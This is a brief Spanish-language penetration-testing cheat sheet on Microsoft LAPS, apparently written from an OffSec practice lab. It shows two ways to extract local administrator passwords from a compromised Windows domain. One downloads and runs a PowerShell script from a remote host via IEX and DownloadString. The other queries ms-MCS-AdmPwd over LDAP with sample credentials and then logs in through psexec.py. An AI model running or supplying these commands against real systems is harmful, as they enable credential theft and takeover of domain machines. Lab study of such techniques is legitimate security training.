# LAPS 

Tags: #Windows #LAPS 

**LAPS (Local Administrator Password Solution)** es una solución de Microsoft que gestiona **automáticamente las contraseñas de administrador local** en máquinas Windows unidas a dominio.

```bash 
# Ruta de instalación
C:\Program Files\LAPS 
```

## LASP Forma 1

```bash 
❯ https://github.com/kfosaaen/Get-LAPSPasswords   # Descargar 'Get-LAPSPasswords.ps1' y transferirlo a la máquina Windows comprometida
❯ IEX (New-Object Net.WebClient).DownloadString('https://IP/Get-LAPSPasswords.ps1')  # Importar el módulo 

❯ Get-LAPSPasswords          # Ejecutar la función para obtener la password de Administrator
```

## LAPS Forma 2
```bash 
❯ ldapsearch -x -H 'ldap://192.168.142.122' -D 'hutch\fmcsorley' -w 'CrabSharkJellyfish192' -b 'dc=hutch,dc=offsec' "(ms-MCS-AdmPwd=*)" ms-MCS-AdmPwd

❯ psexec.py -u administrator -p 'G4$4Yk-2n&x()' 192.168.142.122
```